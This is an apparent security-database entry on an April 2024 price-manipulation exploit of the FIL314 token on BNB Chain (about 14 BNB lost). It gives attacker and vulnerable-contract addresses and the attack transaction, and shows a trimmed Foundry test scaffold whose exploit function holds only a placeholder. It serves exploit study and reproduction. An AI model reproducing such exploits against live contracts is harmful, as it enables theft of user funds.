# [?] FIL314 - Insufficient Validation And Price Manipulation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: FIL314
Published: 2024-04-12
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/FIL314_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~14 BNB

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~14 BNB
// Attacker : https://bscscan.com/address/0x4645863205b47a0a3344684489e8c446a437d66c
// Attack Contract : https://bscscan.com/address/0xde521fbbbb0dbcfa57325a9896c34941f23e96a0
// Created Attack Contract: https://bscscan.com/address/0x5C01B97299b32BaF75B4940fDaE158656C231847
// Vulnerable Contract : https://bscscan.com/address/0xe8a290c6fc6fa6c0b79c9cfae1878d195aeb59af
// Attack Tx : https://bscscan.com/tx/0x9f2eb13417190e5139d57821422fc99bced025f24452a8b31f7d68133c9b0a6c

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xe8a290c6fc6fa6c0b79c9cfae1878d195aeb59af#code

interface IFIL314 {
    function getAmountOut(uint256 value, bool buy) external returns (uint256);
    function hourBurn() external;
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract FIL314 is Test {
    uint256 blocknumToForkFrom = 37_795_991;
    IFIL314 FIL314 = IFIL314(0xE8A290c6Fc6Fa6C0b79C9cfaE1878d195aeb59aF);

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
    }

    function testExploit() public {
        // Implement exploit code here
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/FIL314_exp.sol_
